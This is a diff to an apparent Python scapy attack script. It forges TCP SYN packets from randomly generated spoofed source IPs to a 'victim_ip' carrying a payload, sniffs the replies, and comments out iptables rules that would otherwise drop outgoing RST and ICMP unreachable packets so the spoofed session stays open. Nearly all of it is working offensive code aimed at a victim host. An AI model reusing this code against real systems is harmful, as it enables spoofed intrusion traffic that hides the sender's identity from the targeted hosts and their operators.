@@ -31,13 +31,14 @@ def spoof(src_ip, dst_ip):
 
 	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')
 
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
-		s.connect((dst_ip, dst_port))
-		s.send(packet)
-	except Exception as e:
-		raise e
+	#try:
+	#	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	packet = IP(dst=dst_ip, src=src_ip) / TCP(dport=dst_port, sport=src_port, flags='S') / pld_VERSION
+	#	s.connect((dst_ip, dst_port))
+	send(packet)
+
+	#except Exception as e:
+	#	raise e
 	'''
 	ip = ImpactPacket.IP()
 	ip.set_ip_src(src_ip)
@@ -73,19 +74,31 @@ def spoof(src_ip, dst_ip):
 	return
 
 def initialize_connection(victim_ip):
-	#iptables -t raw -A PREROUTING -p tcp --dport <source port I use for scapy traffic> -j DROP
-	terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -d {victim_ip} -dport {victim_port} -j DROP')
-	terminal(f'iptables -A OUTPUT -s {spoof_ip} -d {victim_ip} -p ICMP --icmp-type port-unreachable -j DROP')
 	spoof_ip = random_ip()
 	pending_spoof_IPs.append(spoof_ip)
 
+	# Remove all entries
+	#sudo iptables -F
+
+	#terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {attacker_port} -j DROP')
+	#terminal(f'iptables -t raw -A PREROUTING -p tcp --dport {victim_port} -j DROP')
+
+	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -j DROP')
+	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {spoof_ip} -d {victim_ip} -dport {victim_port} -j DROP')
+	#terminal(f'iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -d {spoof_ip} -dport {attacker_port} -j DROP')
+	#terminal(f'iptables -A OUTPUT -s {spoof_ip} -d {victim_ip} -p ICMP --icmp-type port-unreachable -j DROP')
+
 	spoof(src_ip = spoof_ip, dst_ip = victim_ip)
 
-def cleanup():
+def cleanup_iptables():
 	if(os.path.exists(iptables_file_path)):
 		terminal(f'iptables-restore < {iptables_file_path}')
 		os.remove(iptables_file_path)
 		print('Cleaning up IP table')
+
+def backup_iptables():
+	terminal(f'iptables-save > {iptables_file_path}')
+
 
 def packet_received(packet):
 	try:
@@ -116,9 +129,10 @@ def packet_received(packet):
 
 
 if __name__ == '__main__':
-	atexit.register(cleanup)
-	cleanup()
-	terminal(f'iptables-save > {iptables_file_path}')
+	atexit.register(cleanup_iptables)
+	cleanup_iptables()
+	backup_iptables()
+
 	try:
 		start_new_thread(sniff, (), {
 			'iface':'enp0s3',
